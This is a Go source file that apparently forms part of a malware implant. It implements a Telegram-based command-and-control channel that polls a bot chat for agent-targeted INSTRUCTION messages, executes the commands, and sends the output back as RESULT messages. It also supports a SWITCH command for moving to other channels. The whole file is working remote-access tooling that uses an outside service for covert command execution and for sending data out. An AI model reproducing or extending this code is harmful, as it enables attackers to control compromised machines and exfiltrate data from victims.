package telegram

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"

	"agent/core"
)

// ─────────────────────────────────────────
// Telegram API types
// ─────────────────────────────────────────

type Update struct {
	UpdateID int     `json:"update_id"`
	Message  Message `json:"message"`
}

type Message struct {
	MessageID int    `json:"message_id"`
	Text      string `json:"text"`
	Chat      Chat   `json:"chat"`
	From      User   `json:"from"`
	Date      int64  `json:"date"`
}

type Chat struct {
	ID int64 `json:"id"`
}

type User struct {
	ID        int64  `json:"id"`
	FirstName string `json:"first_name"`
	Username  string `json:"username"`
	IsBot     bool   `json:"is_bot"`
}

type UpdateResponse struct {
	Ok     bool     `json:"ok"`
	Result []Update `json:"result"`
}

// ─────────────────────────────────────────
// Client — implements core.C2Channel
// ─────────────────────────────────────────

type Client struct {
	token   string
	chatID  int64
	apiURL  string
	agentID string
	execute core.ExecuteFunc
}

// NewClient creates a Telegram C2 channel.
func NewClient(token string, chatID int64, agentID string, exec core.ExecuteFunc) *Client {
	return &Client{
		token:   token,
		chatID:  chatID,
		apiURL:  fmt.Sprintf("https://api.telegram.org/bot%s", token),
		agentID: agentID,
		execute: exec,
	}
}

// ─────────────────────────────────────────
// C2Channel interface implementation
// ─────────────────────────────────────────

func (c *Client) Name() string { return "telegram" }

func (c *Client) Connect() error {
	resp, err := http.Get(fmt.Sprintf("%s/getMe", c.apiURL))
	if err != nil {
		return fmt.Errorf("telegram connect failed: %w", err)
	}
	defer resp.Body.Close()

	var result struct {
		Ok bool `json:"ok"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	if !result.Ok {
		return fmt.Errorf("telegram token is invalid")
	}
	return nil
}

func (c *Client) Listen(ctx context.Context) error {
	offset := -1
	log.Printf("[%s] Listening for commands...", c.Name())

	for {
		select {
		case <-ctx.Done():
			log.Printf("[%s] Shutting down listener", c.Name())
			return nil
		default:
		}

		updates, err := c.getUpdates(offset)
		if err != nil {
			log.Printf("[%s] Error fetching updates: %v", c.Name(), err)
			continue
		}

		for _, update := range updates {
			offset = update.UpdateID + 1

			msg := update.Message
			if msg.Text == "" || msg.Chat.ID != c.chatID {
				continue
			}

			text := msg.Text

			// ── SWITCH|<agent_id>|<channel_name> ──
			if strings.HasPrefix(text, "SWITCH|") {
				parts := strings.SplitN(text, "|", 3)
				if len(parts) == 3 && parts[1] == c.agentID {
					targetChannel := parts[2]
					log.Printf("[%s] Received SWITCH command → %s", c.Name(), targetChannel)
					return &core.SwitchError{TargetChannel: targetChannel}
				}
				continue
			}

			// ── INSTRUCTION|<agent_id>|<instr_id>|<command> ──
			if !strings.HasPrefix(text, "INSTRUCTION|") {
				continue
			}

			parts := strings.SplitN(text, "|", 4)
			if len(parts) != 4 {
				continue
			}

			// Filter: only process instructions for our agent ID
			if parts[1] != c.agentID {
				continue
			}

			instr := core.Instruction{
				ID:      parts[2],
				Command: parts[3],
			}

			log.Printf("[%s] [%s] $ %s", c.Name(), instr.ID, instr.Command)

			// Execute asynchronously — don't block polling
			go c.handleInstruction(instr)
		}
	}
}

func (c *Client) Disconnect() error {
	log.Printf("[%s] Disconnected", c.Name())
	return nil
}

func (c *Client) SendMessage(text string) error {
	return c.sendMessage(text)
}

// ─────────────────────────────────────────
// Internal helpers
// ─────────────────────────────────────────

func (c *Client) handleInstruction(instr core.Instruction) {
	output := c.execute(instr.Command)

	// Telegram has a 4096 char limit — truncate if needed
	if len(output) > 3800 {
		output = output[:3800] + "\n... (truncated)"
	}

	// RESULT|<agent_id>|<instr_id>|<output>
	result := fmt.Sprintf("RESULT|%s|%s|%s", c.agentID, instr.ID, output)
	if err := c.sendMessage(result); err != nil {
		log.Printf("[%s] Failed to send result for %s: %v", c.Name(), instr.ID, err)
	} else {
		log.Printf("[%s] [%s] Result sent", c.Name(), instr.ID)
	}
}

func (c *Client) getUpdates(offset int) ([]Update, error) {
	endpoint := fmt.Sprintf("%s/getUpdates", c.apiURL)

	params := url.Values{}
	params.Set("timeout", "10")
	params.Set("allowed_updates", `["message"]`)
	params.Set("offset", strconv.Itoa(offset))

	resp, err := http.Get(endpoint + "?" + params.Encode())
	if err != nil {
		return nil, fmt.Errorf("http get failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("reading body failed: %w", err)
	}

	var result UpdateResponse
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("json parse failed: %w", err)
	}

	if !result.Ok {
		return nil, fmt.Errorf("telegram api returned not ok")
	}

	return result.Result, nil
}

func (c *Client) sendMessage(text string) error {
	endpoint := fmt.Sprintf("%s/sendMessage", c.apiURL)

	payload := map[string]interface{}{
		"chat_id": c.chatID,
		"text":    text,
	}

	body, _ := json.Marshal(payload)
	resp, err := http.Post(endpoint, "application/json", bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("send message failed: %w", err)
	}
	defer resp.Body.Close()

	var result struct {
		Ok          bool   `json:"ok"`
		Description string `json:"description"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	if !result.Ok {
		return fmt.Errorf("telegram rejected message: %s", result.Description)
	}

	return nil
}
